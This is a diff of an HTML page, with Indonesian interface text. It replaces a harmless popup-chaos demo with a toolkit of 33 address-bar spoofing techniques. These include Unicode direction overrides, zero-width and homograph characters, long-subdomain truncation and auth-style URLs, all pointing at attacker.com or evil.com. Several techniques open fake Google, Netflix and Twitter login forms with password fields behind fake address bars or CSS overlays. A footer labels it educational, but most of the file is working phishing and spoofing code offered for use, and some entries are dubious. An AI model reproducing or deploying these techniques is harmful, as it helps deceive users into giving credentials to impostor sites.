@@ -1,383 +1,542 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-<meta charset="UTF-8">
-<title>VOID CHAOS ENGINE</title>
-
-<style>
-
-body{
-    margin:0;
-    background:black;
-    color:#00ff99;
-    font-family:monospace;
-    overflow:hidden;
-}
-
-.container{
-    height:100vh;
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-    text-align:center;
-}
-
-button{
-    padding:14px 22px;
-    background:black;
-    color:#00ff99;
-    border:1px solid #00ff99;
-    cursor:pointer;
-    font-size:16px;
-}
-
-button:hover{
-    box-shadow:0 0 20px #00ff99;
-}
-
-.glitch{
-    animation:flicker .08s infinite;
-}
-
-@keyframes flicker{
-    0%{opacity:1}
-    50%{opacity:.3}
-    100%{opacity:1}
-}
-
-.stream{
-    position:fixed;
-    pointer-events:none;
-    font-size:12px;
-    opacity:.7;
-}
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 SIMPLE ADDRESS BAR SPOOFING</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2a 100%);
+            font-family: 'SF Mono', 'Courier New', monospace;
+            color: #0f0;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container { max-width: 1200px; margin: 0 auto; }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0,0,0,0.85);
+            border-radius: 20px;
+            border: 2px solid #ff00ff;
+        }
+        
+        .header h1 {
+            font-size: 1.5em;
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .demo-box {
+            background: #0a0a0a;
+            border: 1px solid #ff00ff;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .address-bar-sim {
+            background: #2a2a2a;
+            border-radius: 30px;
+            padding: 10px 20px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 0.9em;
+            color: #ddd;
+            text-align: left;
+        }
+        
+        .spoofed { color: #ff3366; font-weight: bold; }
+        .hidden { color: #666; font-style: italic; }
+        
+        .method-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .method-card {
+            background: rgba(0,0,0,0.8);
+            border-radius: 12px;
+            padding: 15px;
+            border: 1px solid rgba(255,0,255,0.3);
+            transition: 0.2s;
+        }
+        
+        .method-card:hover {
+            transform: translateY(-3px);
+            border-color: #00ffff;
+        }
+        
+        .method-title {
+            color: #ff00ff;
+            font-size: 0.85em;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        .method-code {
+            background: #1a1a2a;
+            padding: 8px;
+            border-radius: 6px;
+            font-size: 0.6em;
+            font-family: monospace;
+            margin: 8px 0;
+            overflow-x: auto;
+            color: #0ff;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            color: #000;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            font-size: 0.7em;
+        }
+        
+        button.danger { background: linear-gradient(135deg, #ff0000, #ff6600); color: white; }
+        
+        .log-area {
+            background: #0a0a0a;
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 20px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 0.65em;
+        }
+        
+        .log-entry {
+            padding: 3px;
+            border-bottom: 1px solid #333;
+        }
+        .log-entry.success { color: #0f0; }
+        .log-entry.spoof { color: #ff00ff; }
+        
+        .footer {
+            text-align: center;
+            padding: 15px;
+            background: rgba(0,0,0,0.8);
+            border-radius: 15px;
+            margin-top: 20px;
+            font-size: 0.6em;
+        }
+    </style>
 </head>
-
 <body>
-
 <div class="container">
-
-    <h1 class="glitch">
-        ⚠ ABSURD WINDOW EXPERIMENT ⚠
-    </h1>
-
-    <p>
-        Click to open a “quantum window”
-    </p>
-
-    <button onclick="openChaos()">
-        OPEN VOID WINDOW
-    </button>
-
+    <div class="header">
+        <h1>🔥 SIMPLE ADDRESS BAR SPOOFING</h1>
+        <p>RTL Characters | Port Ilegal | Zero-Width | Long Subdomain</p>
+    </div>
+    
+    <div class="demo-box">
+        <div class="address-bar-sim">
+            🔒 <span class="spoofed" id="visibleUrl">https://www.google.com</span><span class="hidden" id="hiddenUrl">.attacker.com</span>
+        </div>
+        <p style="font-size:0.7em;">💀 Yang Anda lihat di address bar vs Domain asli (tersembunyi)</p>
+    </div>
+    
+    <div class="method-grid" id="methodGrid"></div>
+    
+    <div class="log-area" id="logArea">
+        <div class="log-entry">🔥 Simple Address Bar Spoofing Loaded</div>
+        <div class="log-entry">🎯 Klik tombol untuk test teknik spoofing</div>
+    </div>
+    
+    <div class="footer">
+        <div>⚠️ EDUCATIONAL PURPOSE - Test pada browser Anda sendiri</div>
+    </div>
 </div>
 
 <script>
-
-function openChaos(){
-
-    const x = window.open(
-        "about:blank",
-        "_blank",
-        "width=420,height=320"
-    );
-
-    if(!x){
-        alert("Popup blocked");
-        return;
+    const logArea = document.getElementById('logArea');
+    const visibleUrlSpan = document.getElementById('visibleUrl');
+    const hiddenUrlSpan = document.getElementById('hiddenUrl');
+    
+    function addLog(msg, type = 'info') {
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type}`;
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logArea.appendChild(entry);
+        logArea.scrollTop = logArea.scrollHeight;
+        if(logArea.children.length > 20) logArea.removeChild(logArea.children[0]);
     }
-
-    // stage 1
-    x.document.write(`
-
-<!DOCTYPE html>
-
-<html>
-
-<head>
-
-<title>LOADING...</title>
-
-<style>
-
-body{
-    background:black;
-    color:lime;
-    font-family:monospace;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    margin:0;
-}
-
-</style>
-
-</head>
-
-<body>
-
-<h3>
-Initializing portal...
-</h3>
-
-</body>
-
-</html>
-
-    `);
-
-    x.document.close();
-
-    // stage 2
-    setTimeout(() => {
-
-        x.document.open();
-
-        x.document.write(`
-
-<!DOCTYPE html>
-
-<html>
-
-<head>
-
-<meta charset="UTF-8">
-
-<title>VOID SYSTEM ACTIVE</title>
-
-<style>
-
-body{
-    margin:0;
-    background:
-        radial-gradient(circle,#111,#000);
-    color:#00ff99;
-    font-family:monospace;
-    overflow:hidden;
-}
-
-.panel{
-    width:90%;
-    margin:20px auto;
-    padding:15px;
-    border:1px solid #00ff99;
-    border-radius:10px;
-    box-shadow:0 0 20px #00ff99;
-}
-
-.glitch{
-    animation:flicker .08s infinite;
-}
-
-@keyframes flicker{
-    0%{opacity:1}
-    50%{opacity:.4}
-    100%{opacity:1}
-}
-
-button{
-    padding:10px;
-    background:black;
-    color:#00ff99;
-    border:1px solid #00ff99;
-    cursor:pointer;
-    margin-right:10px;
-}
-
-.stream{
-    position:fixed;
-    font-size:12px;
-    pointer-events:none;
-    opacity:.7;
-}
-
-</style>
-
-</head>
-
-<body>
-
-<div class="panel">
-
-<h2 class="glitch">
-⚠ VOID INTERFACE ACTIVE ⚠
-</h2>
-
-<p>
-System: unstable memory loop detected
-</p>
-
-<p id="addr"></p>
-
-<button onclick="spawn()">
-Spawn new window
-</button>
-
-<button onclick="window.close()">
-Terminate
-</button>
-
-</div>
-
-<script>
-
-const loops = [];
-
-function addLoop(fn,time){
-    loops.push(
-        setInterval(fn,time)
-    );
-}
-
-function rand(len=8){
-    return Math.random()
-        .toString(36)
-        .substring(2,2+len);
-}
-
-// address mutation
-addLoop(()=>{
-
-    document.getElementById("addr")
-        .innerHTML =
-        "address://unknown/" +
-        rand(10);
-
-},300);
-
-// title mutation
-addLoop(()=>{
-
-    document.title =
-        "VOID://" +
-        rand(6);
-
-},600);
-
-// floating random text
-addLoop(()=>{
-
-    const div =
-        document.createElement("div");
-
-    div.className = "stream";
-
-    div.innerHTML =
-        rand(20);
-
-    div.style.left =
-        Math.random()*window.innerWidth+"px";
-
-    div.style.top =
-        Math.random()*window.innerHeight+"px";
-
-    div.style.color =
-        "hsl(" +
-        Math.random()*360 +
-        ",100%,50%)";
-
-    div.style.transform =
-        "rotate(" +
-        Math.random()*360 +
-        "deg)";
-
-    document.body.appendChild(div);
-
-    if(document.body.children.length > 150){
-
-        document.body.removeChild(
-            document.body.children[3]
-        );
-
+    
+    function updateSimulation(visible, hidden) {
+        visibleUrlSpan.textContent = visible;
+        hiddenUrlSpan.textContent = hidden;
     }
-
-},40);
-
-// random visual corruption
-addLoop(()=>{
-
-    document.body.style.filter =
-        \`
-        hue-rotate(\${Math.random()*360}deg)
-        blur(\${Math.random()*2}px)
-        contrast(\${1+Math.random()*4})
-        \`;
-
-},120);
-
-// console chaos
-addLoop(()=>{
-
-    console.log(
-        "%cVOID://" + rand(10),
-
-        \`
-        color:hsl(\${Math.random()*360},100%,50%);
-        font-size:\${10+Math.random()*30}px;
-        \`
-    );
-
-},100);
-
-// recursive popup
-function spawn(){
-
-    const weird =
-        btoa(
-            "<h1>VOID NODE</h1>" +
-            rand(50)
-        );
-
-    const w = window.open(
-        "data:text/html;base64," + weird,
-        "_blank",
-        "width=300,height=200"
-    );
-
-    if(!w) return;
-
-    setTimeout(() => {
-
-        try{
-
-            w.document.body.style.background =
-                "black";
-
-            w.document.body.style.color =
-                "lime";
-
-            w.document.body.style.fontFamily =
-                "monospace";
-
-            w.document.body.innerHTML +=
-                "<br><br>recursive node active: " +
-                rand(12);
-
-        }catch(e){}
-
-    },800);
-
-}
-
-<\/script>
-
-</body>
-
-</html>
-
+    
+    // ============ TEKNIK 1: RTL OVERRIDE (U+202E) ============
+    function spoof1_rtl() {
+        addLog("🔄 RTL Override - U+202E", 'spoof');
+        const rtl = '\u202E';
+        const url = `https://${rtl}moc.elgoog//:sptth.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com (via RTL)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 2: PORT ILEGAL (PORT 0) ============
+    function spoof2_portZero() {
+        addLog("🔌 Port 0 - Invalid port number", 'spoof');
+        const url = 'https://www.google.com:0';
+        updateSimulation("https://www.google.com:0", "(port invalid - browser bingung)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 3: PORT 65535 (MAX) ============
+    function spoof3_portMax() {
+        addLog("🔌 Port 65535 - Max port", 'spoof');
+        const url = 'https://www.google.com:65535';
+        updateSimulation("https://www.google.com:65535", "(max port - mungkin error)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 4: PORT 8080 (BLOCKED) ============
+    function spoof4_portBlocked() {
+        addLog("🔌 Port 8080 - Usually blocked", 'spoof');
+        const url = 'https://www.google.com:8080';
+        updateSimulation("https://www.google.com:8080", "(port mungkin unreachable)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 5: RLO + PORT COMBO ============
+    function spoof5_rtlPort() {
+        addLog("🔄 RTL + Port 8080 Combo", 'spoof');
+        const rtl = '\u202E';
+        const url = `https://${rtl}moc.elgoog//:sptth:8080.attacker.com`;
+        updateSimulation("https://www.google.com:8080", ".attacker.com");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 6: ZERO-WIDTH CHARACTERS ============
+    function spoof6_zeroWidth() {
+        addLog("👻 Zero-Width Characters (invisible)", 'spoof');
+        const zw = '\u200B\u200C\u200D';
+        const url = `https://google.com${zw}.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com (dengan karakter invisible)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 7: LONG SUBDOMAIN TRUNCATION ============
+    function spoof7_longSubdomain() {
+        addLog("📏 Long Subdomain - CVE-2026-44659 style", 'spoof');
+        const long = 'accounts.google.com.secure.login.verify.this.is.extremely.long.subdomain';
+        const url = `https://${long}.attacker.com`;
+        updateSimulation(`${long.substring(0, 60)}...`, ".attacker.com (tersembunyi)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 8: RLE (U+202B) ============
+    function spoof8_rle() {
+        addLog("📝 RLE Embedding - U+202B", 'spoof');
+        const rle = '\u202B';
+        const pdf = '\u202C';
+        const url = `https://${rle}google.com${pdf}.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 9: LRI ISOLATE (U+2066) ============
+    function spoof9_lri() {
+        addLog("🔲 LRI Isolate - U+2066", 'spoof');
+        const lri = '\u2066';
+        const pdi = '\u2069';
+        const url = `https://${lri}google.com${pdi}.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 10: RLI ISOLATE (U+2067) ============
+    function spoof10_rli() {
+        addLog("🔲 RLI Isolate - U+2067", 'spoof');
+        const rli = '\u2067';
+        const pdi = '\u2069';
+        const url = `https://${rli}google.com${pdi}.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 11: ARABIC LETTER MARK (U+061C) ============
+    function spoof11_alm() {
+        addLog("🔖 Arabic Letter Mark - U+061C", 'spoof');
+        const alm = '\u061C';
+        const url = `https://${alm}google.com.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 12: RLM (U+200F) ============
+    function spoof12_rlm() {
+        addLog("➡️ Right-to-Left Mark - U+200F", 'spoof');
+        const rlm = '\u200F';
+        const url = `https://${rlm}google.com.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 13: LRM (U+200E) ============
+    function spoof13_lrm() {
+        addLog("⬅️ Left-to-Right Mark - U+200E", 'spoof');
+        const lrm = '\u200E';
+        const url = `https://google.com${lrm}.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 14: NULL BYTE INJECTION ============
+    function spoof14_nullByte() {
+        addLog("💀 NULL Byte Injection - %00", 'spoof');
+        const url = 'https://google.com\x00.attacker.com';
+        updateSimulation("https://www.google.com", ".attacker.com (null byte memotong)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 15: DATA URI SPOOF ============
+    function spoof15_dataURI() {
+        addLog("📦 Data URI Spoof", 'spoof');
+        const html = '<title>https://www.paypal.com</title><h1>Fake PayPal</h1>';
+        const url = `data:text/html,${encodeURIComponent(html)}`;
+        updateSimulation("https://www.paypal.com", "(data URI)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 16: BLOB URL SPOOF ============
+    function spoof16_blob() {
+        addLog("💾 Blob URL Spoof", 'spoof');
+        const blob = new Blob(['<title>https://www.amazon.com</title><h1>Fake Amazon</h1>'], {type: 'text/html'});
+        const url = URL.createObjectURL(blob);
+        updateSimulation("https://www.amazon.com", "(blob URL)");
+        window.open(url, '_blank');
+        setTimeout(() => URL.revokeObjectURL(url), 5000);
+    }
+    
+    // ============ TEKNIK 17: JAVASCRIPT URI ============
+    function spoof17_jsURI() {
+        addLog("📜 JavaScript URI Spoof", 'spoof');
+        const url = "javascript:document.write('<title>https://www.facebook.com</title><h1>Fake Facebook</h1>');void(0)";
+        updateSimulation("https://www.facebook.com", "(javascript URI)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 18: about:blank + history ============
+    function spoof18_aboutBlank() {
+        addLog("📄 about:blank + history.pushState", 'spoof');
+        const win = window.open('about:blank', '_blank');
+        win.document.write('<h1>Fake Google Login</h1><input placeholder="Email"><input type="password" placeholder="Password">');
+        win.history.pushState({}, 'Google', 'https://www.google.com');
+        updateSimulation("https://www.google.com", "(about:blank + history)");
+    }
+    
+    // ============ TEKNIK 19: view-source SPOOF ============
+    function spoof19_viewSource() {
+        addLog("🔍 view-source Spoof", 'spoof');
+        const url = 'view-source:https://www.google.com:8080';
+        updateSimulation("view-source:https://www.google.com:8080", "(source code)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 20: FRAGMENT IDENTIFIER ============
+    function spoof20_fragment() {
+        addLog("# Fragment Identifier Spoof", 'spoof');
+        const url = 'https://google.com#https://www.paypal.com';
+        updateSimulation("https://www.google.com", "#https://www.paypal.com (fragment)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 21: USERNAME:PASSWORD SPOOF ============
+    function spoof21_auth() {
+        addLog("👤 Username:Password Spoof", 'spoof');
+        const url = 'https://google.com:password@evil.com';
+        updateSimulation("https://www.google.com", ":password@evil.com (auth URL)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 22: MIXED RTL/LTR ============
+    function spoof22_mixedRTL() {
+        addLog("🔄 Mixed RTL + LTR", 'spoof');
+        const rtl = '\u202E';
+        const ltr = '\u202D';
+        const url = `https://${rtl}${ltr}google.com.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 23: HEBREW CHARACTERS ============
+    function spoof23_hebrew() {
+        addLog("✡️ Hebrew Characters Spoof", 'spoof');
+        const hebrew = '\u05D0\u05D1\u05D2';
+        const url = `https://${hebrew}.google.com.attacker.com`;
+        updateSimulation("https://www.google.com", ".attacker.com (dengan Hebrew)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 24: ARABIC CHARACTERS ============
+    function spoof24_arabic() {
+        addLog("🇸🇦 Arabic Characters Spoof", 'spoof');
+        const arabic = '\u0627\u0644\u0639\u0631\u0628\u064A\u0629';
+        const url = `https://${arabic}.paypal.com.attacker.com`;
+        updateSimulation("https://www.paypal.com", ".attacker.com (dengan Arabic)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 25: PERCENT ENCODING ============
+    function spoof25_percent() {
+        addLog("% Percent Encoding Spoof", 'spoof');
+        const url = 'https://%25%30%30google.com';
+        updateSimulation("https://%google.com", "(percent encoding chaos)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 26: DOUBLE ENCODING ============
+    function spoof26_double() {
+        addLog("🔁 Double Encoding Spoof", 'spoof');
+        const url = 'https://%253A%252F%252Fgoogle.com';
+        updateSimulation("https://%3A%2F%2Fgoogle.com", "(double encoded)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 27: IDN HOMOGRAPH ============
+    function spoof27_idn() {
+        addLog("🌐 IDN Homograph Attack", 'spoof');
+        const fake = 'https://gοοgle.com'; // Greek omicron instead of o
+        updateSimulation("https://www.google.com", "(IDN homograph - huruf Yunani)");
+        window.open(fake, '_blank');
+    }
+    
+    // ============ TEKNIK 28: PUNYCODE ============
+    function spoof28_punycode() {
+        addLog("📝 Punycode Spoof", 'spoof');
+        const url = 'https://xn--80ak6aa92e.com';
+        updateSimulation("https://apple.com", "(punycode encoding)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 29: IP ADDRESS SPOOF ============
+    function spoof29_ip() {
+        addLog("📡 IP Address Spoof", 'spoof');
+        const url = 'https://142.250.190.46/---https://google.com';
+        updateSimulation("https://www.google.com", "(IP address dengan fake path)");
+        window.open(url, '_blank');
+    }
+    
+    // ============ TEKNIK 30: WINDOW NAME SPOOF ============
+    function spoof30_windowName() {
+        addLog("🏷️ Window Name Spoof", 'spoof');
+        const win = window.open('', '_blank');
+        win.name = 'https://www.twitter.com';
+        win.document.write('<h1>Fake Twitter Login</h1>');
+        updateSimulation("https://www.twitter.com", "(window.name)");
+    }
+    
+    // ============ TEKNIK 31: FULLSCREEN FAKE BAR ============
+    function spoof31_fullscreen() {
+        addLog("🖥️ Fullscreen Fake Address Bar", 'spoof');
+        const win = window.open('', '_blank');
+        win.document.write(`
+            <style>
+                .fake-bar { position:fixed; top:0; left:0; right:0; background:#fff; padding:10px; z-index:99999; font-family:monospace; border-bottom:1px solid #ccc; }
+                .fake-url { background:#f1f3f4; padding:5px 15px; border-radius:20px; display:inline-block; }
+            </style>
+            <div class="fake-bar">🔒 <span class="fake-url">https://www.google.com</span></div>
+            <div style="margin-top:60px; padding:20px;"><h1>Fake Google</h1><input placeholder="Email"><input type="password" placeholder="Password"></div>
+            <script>document.documentElement.requestFullscreen();<\/script>
         `);
-
-        x.document.close();
-
-    },1800);
-
-}
-
+        updateSimulation("https://www.google.com", "(fullscreen - fake bar)");
+    }
+    
+    // ============ TEKNIK 32: CSS OVERLAY ============
+    function spoof32_css() {
+        addLog("🎨 CSS Overlay Spoof", 'spoof');
+        const win = window.open('', '_blank');
+        win.document.write(`
+            <style>
+                body::before {
+                    content: '🔒 https://www.netflix.com';
+                    position: fixed; top: 0; left: 0; right: 0;
+                    background: #141414; padding: 10px; z-index: 99999;
+                    font-family: monospace; color: white; text-align: center;
+                }
+            </style>
+            <div style="margin-top:50px;"><h1>Fake Netflix</h1><input placeholder="Email"><input type="password" placeholder="Password"></div>
+        `);
+        updateSimulation("https://www.netflix.com", "(CSS overlay)");
+    }
+    
+    // ============ TEKNIK 33: META REFRESH ============
+    function spoof33_metaRefresh() {
+        addLog("🔄 Meta Refresh Spoof", 'spoof');
+        const html = `<meta http-equiv="refresh" content="0; url=https://www.google.com:8080"><title>Google</title><h1>Fake Content</h1>`;
+        const blob = new Blob([html], {type: 'text/html'});
+        window.open(URL.createObjectURL(blob), '_blank');
+        updateSimulation("https://www.google.com:8080", "(meta refresh)");
+    }
+    
+    // ============ BUILD UI ============
+    const methods = [
+        {name: "RTL Override (U+202E)", func: spoof1_rtl, desc: "Membalik URL - google.com jadi moc.elgoog"},
+        {name: "Port 0 (Invalid)", func: spoof2_portZero, desc: "Port 0 membuat browser bingung"},
+        {name: "Port 65535 (Max)", func: spoof3_portMax, desc: "Port maksimum - mungkin error"},
+        {name: "Port 8080 (Blocked)", func: spoof4_portBlocked, desc: "Port yang sering diblokir"},
+        {name: "RTL + Port Combo", func: spoof5_rtlPort, desc: "Kombinasi RTL dan port"},
+        {name: "Zero-Width Characters", func: spoof6_zeroWidth, desc: "Karakter invisible di URL"},
+        {name: "Long Subdomain", func: spoof7_longSubdomain, desc: "Truncation CVE-2026-44659"},
+        {name: "RLE Embedding", func: spoof8_rle, desc: "Right-to-Left Embedding"},
+        {name: "LRI Isolate", func: spoof9_lri, desc: "Left-to-Right Isolate"},
+        {name: "RLI Isolate", func: spoof10_rli, desc: "Right-to-Left Isolate"},
+        {name: "Arabic Letter Mark", func: spoof11_alm, desc: "U+061C - Arabic Letter Mark"},
+        {name: "RLM (U+200F)", func: spoof12_rlm, desc: "Right-to-Left Mark"},
+        {name: "LRM (U+200E)", func: spoof13_lrm, desc: "Left-to-Right Mark"},
+        {name: "NULL Byte", func: spoof14_nullByte, desc: "Null byte injection %00"},
+        {name: "Data URI", func: spoof15_dataURI, desc: "data:text/html spoof"},
+        {name: "Blob URL", func: spoof16_blob, desc: "Blob URL dengan fake title"},
+        {name: "JavaScript URI", func: spoof17_jsURI, desc: "javascript: pseudo-protocol"},
+        {name: "about:blank + History", func: spoof18_aboutBlank, desc: "history.pushState spoof"},
+        {name: "view-source", func: spoof19_viewSource, desc: "view-source: protocol"},
+        {name: "Fragment Identifier", func: spoof20_fragment, desc: "# fragment di URL"},
+        {name: "Auth URL", func: spoof21_auth, desc: "username:password@ URL"},
+        {name: "Mixed RTL/LTR", func: spoof22_mixedRTL, desc: "Campuran arah teks"},
+        {name: "Hebrew Characters", func: spoof23_hebrew, desc: "Karakter Hebrew"},
+        {name: "Arabic Characters", func: spoof24_arabic, desc: "Karakter Arab"},
+        {name: "Percent Encoding", func: spoof25_percent, desc: "% encoding chaos"},
+        {name: "Double Encoding", func: spoof26_double, desc: "Double URL encoding"},
+        {name: "IDN Homograph", func: spoof27_idn, desc: "Huruf mirip dari Unicode"},
+        {name: "Punycode", func: spoof28_punycode, desc: "Punycode encoding"},
+        {name: "IP Address", func: spoof29_ip, desc: "IP dengan fake path"},
+        {name: "Window Name", func: spoof30_windowName, desc: "window.name propagation"},
+        {name: "Fullscreen Fake Bar", func: spoof31_fullscreen, desc: "CSS fake address bar"},
+        {name: "CSS Overlay", func: spoof32_css, desc: "CSS visual spoof"},
+        {name: "Meta Refresh", func: spoof33_metaRefresh, desc: "Meta refresh timing"},
+    ];
+    
+    const grid = document.getElementById('methodGrid');
+    methods.forEach((m, i) => {
+        const card = document.createElement('div');
+        card.className = 'method-card';
+        card.innerHTML = `
+            <div class="method-title">${(i+1).toString().padStart(2,'0')}. ${m.name}</div>
+            <div class="method-code">${m.desc}</div>
+            <button onclick="${m.func.name}()">🚀 TEST ${m.name}</button>
+        `;
+        grid.appendChild(card);
+    });
+    
+    addLog("✅ 33 teknik sederhana siap digunakan!", 'success');
+    addLog("💀 Klik tombol untuk melihat efek di address bar", 'spoof');
 </script>
-
 </body>
 </html>
